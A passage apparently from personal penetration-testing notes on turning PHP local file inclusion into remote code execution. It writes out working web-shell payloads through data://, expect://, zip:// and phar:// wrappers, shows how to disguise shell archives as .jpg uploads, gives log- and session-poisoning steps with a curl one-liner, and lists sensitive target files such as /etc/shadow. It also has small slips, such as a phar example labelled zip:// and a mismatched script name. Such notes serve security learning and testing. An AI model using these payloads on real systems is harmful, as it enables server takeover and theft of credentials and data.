> https://example.com/?page=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=id
> ```
> - URL-encoded:
>```
>https://example.com/?page=data://text/plain,%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E&cmd=id
>```

- Through you can transmit data as it as, just with URL encoding, it's more reliable to use Base64, since it avoids URL encoding issues with special characters.

>[!note] Data can be transmitted as is, with just URL encoding, but it's more reliable to use Base64 for data transmission in URLs.

>[!example]+ Example: Base64 `data://` URL
>- Base64-encode: 
> ```bash
> echo -n '<?php system($_GET["cmd"]); ?>' | base64 # PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
> ```
> ```
> data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+
> ```
> ```
>https://example.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+&cmd=id
> ```

>[!note] PHP's `data://` wrapper also supports ROT13 (`data://text/plain;charset=rot13`).

### `expect://`

>The **`expect://` wrapper** allows **direct execution of system commands**.

>[!warning] This wrapper is rarely available since it requires the `expect` PECL extension installed.

>[!warning] The `expect://` wrapper requires the `expect` PECL extension to be installed. This is why it's rarely available (and almost never present on production systems).

Format:

```
expect://command
```

>[!example]+
> ```
> expect://id
> expect://cat%20/etc/passwd
> ```

### `zip://`

>The **`zip://` wrapper** gives access to files within ZIP archives without extracting the archive itself. 

- The wrapper processes any file with a valid ZIP structure; extraction happens in memory. 
- `zip://` doesn't require `allow_url_include=On` and works on **default PHP configuration**.

>[!important] `zip://` can be used to achieve RCE when combined with **file upload functionality**.

Format:

```
zip://[path/to/archive.zip]#[internal_filename]
```

>[!note] The `#` character must be URL-encoded as `%23` in HTTP requests (or the browser will interpret it as an anchor).

>[!example]+ Exploiting `zip://` + file upload functionality to gain RCE
> 1. Create a PHP shell:
> 
> ```bash
> echo '<?php system($_GET["cmd"]); ?>' > shell.php
> ```
> 
> 2. Create a ZIP file:
> 
> ```bash
> zip archive.jpg shell.php
> ```
> 
>>[!important] The extension of the ZIP file doesn't matter — you can upload an archive with a legitimate-looking `.jpg` extension, so the applications thinks it is an image.
> 
> 3. Upload the archive to the server using file upload functionality (such as through avatar upload, pretending it is just an image).
> 
> 4. Access the PHP shell inside the archive using the `zip://` wrapper:
> 
> ```
> https://example.com/index.php?language=zip://./profile_images/archive.jpg%23shell.php&cmd=id
> ```

### `phar://`

- The **`phar://` wrapper** works similarly to `zip://` but uses PHP Archive (PHAR) format.

>[!important] `phar://` can be used to achieve RCE when combined with **file upload functionality**.

Format:

```
phar://[path/to/archive.phar]/[internal_filename]
```


>[!note] The `/` character must be URL-encoded as `%2F` in HTTP requests.


> [!example]+ Exploiting `zip://` + file upload functionality to gain RCE
> 
> 1. Create a PHAR file with a PHP shell inside:
> 
> ```PHP
> # create_shell.php
> <?php
> $phar = new Phar('archive.phar');
> $phar->startBuffering();
> $phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
> $phar->setStub('<?php __HALT_COMPILER(); ?>');
> 
> $phar->stopBuffering();
> ?>
> ```
> 
> ```bash
> php --define phar.readonly=0 cheate_shell.php
> ```
> 
> This will create a file called `archive.phar`, with the PHP code, `<?php system($_GET["cmd"]); ?>`, written to a file inside inside the archive, `shell.txt` .
> 
> 2. Change the file extension:
> 
> ```bash
>  mv archive.phar archive.jpg
> ```
> 
>>[!important] The extension of the PHAR file doesn't matter — you can upload an archive with a legitimate-looking `.jpg` extension as if it were an image.
> 
> ```bash
> echo '<?php system($_GET["cmd"]); ?>' > shell.php
> ```
> 
> 3. Upload the archive to the server using file upload functionality.
> 4. Access the PHP shell inside the archive using the `phar://wrapper`:
> 
> ```
> https://example.com/index.php?language=phar://./profile_images/archive.jpg%2Fshell.txt&cmd=id
> ```

### PHP wrapper cheatsheet

| Wrapper                      | Description                           | Example                                                  | Requires `allow_url_include`? |
| ---------------------------- | ------------------------------------- | -------------------------------------------------------- | ----------------------------- |
| `php://filter`               | Applies transformation filters        | `php://filter/convert.base64-encode/resource=config.php` | ❌ No                          |
| `php://input`                | Reads raw `POST` data                 | `php://input` (with POST body)                           | ✅ Yes                         |
| `data://`                    | Embeds inline data using `RFC 2397`   | `data://text/plain,<?php phpinfo(); ?>`                  | ✅ Yes                         |
| `zip://`                     | Accesses files inside ZIP archives    | `zip://uploads/file.jpg%23shell.php`                     | ❌ No                          |
| `phar://`                    | PHP Archive with auto-deserialization | `phar://uploads/evil.phar/stub`                          | ❌ No                          |
| `expect://`                  | Direct system command execution       | `expect://whoami`                                        | ❌ No                          |
| `file://`                    | Standard filesystem access (default)  | `file:///etc/passwd`                                     | ❌ No                          |
| `http://`, `https://`        | Remote file access via HTTP           | `https://evil.com/shell.php`                             | ✅ Yes (+ `allow_url_fopen`)   |
| `ftp://`                     | Remote file access via FTP            | `ftp://user:pass@evil.com/shell.php`                     | ✅ Yes                         |
| `glob://`                    | Pattern matching for file discovery   | `glob:///var/www/html/*.php`                             | ❌ No                          |
| `php://output`               | Writes to output buffer               | `php://output`                                           | ❌ No                          |
| `php://memory`, `php://temp` | Memory/temporary storage access       | `php://temp`                                             | ❌ No                          

Beyond PHP wrappers, there are other ways to escalate LFI to RCE, such as **log poisoning** and **PHP session poisoning**.
## Log poisoning

Beyond PHP wrappers, there's another way to escalate LFI to RCE: **log posioning**.

Web applications often log various parameters of requests sent by users, such as:
- `User-Agent` header (very common)
- `Referer` header
- Request URI
- Cookies (e.g., `PHPSESSID`).

But everything the user sends is under their control. If the application doesn't properly verify what's written to the logs, it might be possible to inject some code, and then trigger its execution with LFI, by accessing the log file.

For this attack to work:

- A reachable LFI sink can include log flies to which the application writes (e.g., `var/log/apache2/access.log`) **in the PHP runtime** (not just read-as-text) + the web server user must have read access to the log file.
- The target system must be able to execute the code injected in the logs.

>[!example]+ Example: LFI to RCE via log poisoning in the `User-Agent` header  
>
> 1. Inject PHP code into the `User-Agent` header:
> 
> ```
> User-Agent: <?php system($_GET['cmd']); ?>
> ```
> 
> 2. Include the access log with LFI:
> 
> ```
> https://example.com/index.php?page=../../../var/log/apache2/access.log&cmd=id
> ```
> 
> 
> ```bash
> curl -A "<?php system(\$_GET['cmd']); ?>" 'http://example.com/index.php?page=../../../var/log/apache2/access.log&cmd=id'
> ```

>[!example]+ Example: LFI to RCE via log poisoning in `PHPSESSID` cookie
> 1. Set the session variable to the PHP code you want to execute:
> 
> ```
> https://example.com/index.php?session_var=<?php system($_GET['cmd']); ?>
> ```
> 
> 2. Check cookies for `PHPSESSID`:
> 
> ```
> PHPSESSID=abc123
> ```
> 
> 3. Include your session file with LFI:
> 
> ```
> https://example.com/index.php?page=../../../var/lib/php/sessions/sess_abc123$cmd=id
> ```

- PHP session file locations:

```
/var/lib/php/sessions/sess_[PHPSESSID]
/var/lib/php5/sessions/sess_[PHPSESSID]
/var/lib/php7/sessions/sess_[PHPSESSID]
/tmp/sess_[PHPSESSID]
/tmp/sessions/sess_[PHPSESSID]
```

>[!tip]+
>If the attack doesn't work, try bypassing filtering and validation. 

Common log file locations:

- Linux:

```bash
/var/log/apache2/access.log         # Apache access logs
/var/log/apache2/error.log          # Apache error logs
/var/log/nginx/access.log           # Nginx access logs
/var/log/nginx/error.log            # Nginx error logs
/var/log/httpd/access_log           # Apache (CentOS/RHEL)
/var/log/httpd/error_log
/var/log/auth.log                   # authentication attempts
/var/log/mail.log                   # Mail server logs
/var/log/vsftpd.log                 # FTP server logs
/var/log/sshd.log                   # SSH daemon logs
/usr/local/apache2/logs/access_log
/usr/local/apache2/logs/error_log
/var/log/lighttpd/access.log        # Lighttpd
```

- Windows:

```
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\wamp\logs\apache_access.log
C:\Program Files\Apache Group\Apache2\logs\access.log
C:\inetpub\logs\LogFiles\W3SVC1\
```

## Testing checklist

- [ ] Can you read a known file outside the web root?

```
?file=../../../../etc/passwd
```

- [ ] Can you read application source code or configuration files?

```
?file=../../../../var/www/html/config.php
```

>[!tip] 
> Try accessing common files. Here are some wordlists for this:
> - [`LFI-files`](https://raw.githubusercontent.com/hussein98d/LFI-files/master/list.txt)
> - [`Windows-files.txt`](https://raw.githubusercontent.com/soffensive/windowsblindread/master/windows-files.txt)

- [ ] Do PHP wrappers work? (PHP-only)

```
?file=php://filter/convert.base64-encode/resource=index.php
```

- [ ] Can you archive RCE?

```
?file=php://input (with POST payload)
?file=data://text/plain,<?php phpinfo(); ?>
```

## Automated tools

You can also try automated tools like:
- [`LFISuite`](https://github.com/D35m0nd142/LFISuite)
- [`dotdotpwn`](https://github.com/wireghoul/dotdotpwn)

The most common LFI tools are [`LFISuite`](https://github.com/D35m0nd142/LFISuite), [`LFiFreak`](https://github.com/OsandaMalith/LFiFreak), and [`liffy`](https://github.com/mzfr/liffy).

## References and further reading

- [`Local/Remote File Inclusion (LFI/RFI) — hackviser`](https://hackviser.com/tactics/pentesting/web/lfi-rfi)
- [`Path Traversal — OWASP`](https://owasp.org/www-community/attacks/Path_Traversal)
- [`Directory Traversal — swisskyrepo/PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)
- [`File Inclusion/Path traversal — HackTricks`](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

- [`Path (computing) — Wikipedia`](https://en.wikipedia.org/wiki/Path_%28computing%29#Representations_of_paths_by_operating_system_and_shell)
- [`Directory Traversal Attack u2014 Wikipedia`](https://en.wikipedia.org/wiki/Directory_traversal_attack)

- [`FileInc — TryHackMe`](https://tryhackme.com/room/fileinc)

- [`CWE-23: Relative Path Traversal`](https://cwe.mitre.org/data/definitions/23.html)
- [`CWE-35: Path Traversal`](https://cwe.mitre.org/data/definitions/35.html)
- [`CWE-22: Improper Limitation of a Pathname to a Restricted Directory`](https://cwe.mitre.org/data/definitions/22.html)

- [`LFI Cheat Sheet — HighOn.Coffee`](https://highon.coffee/blog/lfi-cheat-sheet/)
- [`File Inclusion — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [`Inclusion Using Wrappers — PayloadsAllTheThings`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md)


- [`Testing for File Inclusion — OWASP WSTG`](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion)
- [`PHP wrappers and streams — The Hacker Recipes`](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams)
- [`File Inclusion — yuyudhn's notes`](https://htb.linuxsec.org/web-application/file-inclusion)
## Appending A: Files to check

{ in progress }
#### Linux/Unix

- System files:

```bash
/etc/passwd              # users
/etc/group               # groups
/etc/shadow              # password hashes (requires root)
/etc/hosts               # host name mappings
/etc/hostname            # system hostname
/etc/resolv.conf         # DNS resolver configuration
/etc/network/interfaces  # network configuration
/etc/fstab               # filesystem mount table
/etc/crontab             # system cron jobs
/proc/self/environ       # current process environment variables
/proc/self/cmdline       # current process command line
/proc/version            # kernel version
/proc/net/tcp            # active network connections
```

- Web server configuration:

```bash
/etc/apache2/apache2.conf                    # main Apache configuration
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf                        # main Nginx configuration
/etc/nginx/sites-enabled/default
/etc/httpd/conf/httpd.conf                   # Apache (CentOS/RHEL)
/usr/local/apache2/conf/httpd.conf
```

- Log files:

```bash
/var/log/apache2/access.log      # Apache access logs
/var/log/apache2/error.log       # Apache error logs
/var/log/nginx/access.log        # Nginx access logs
/var/log/nginx/error.log         # Nginx error logs
/var/log/auth.log                # authentication logs
/var/log/syslog                  # system logs
/var/log/mail.log                # mail server logs
/var/log/vsftpd.log              # FTP server logs
/var/log/mysql/error.log         # MySQL error logs
```

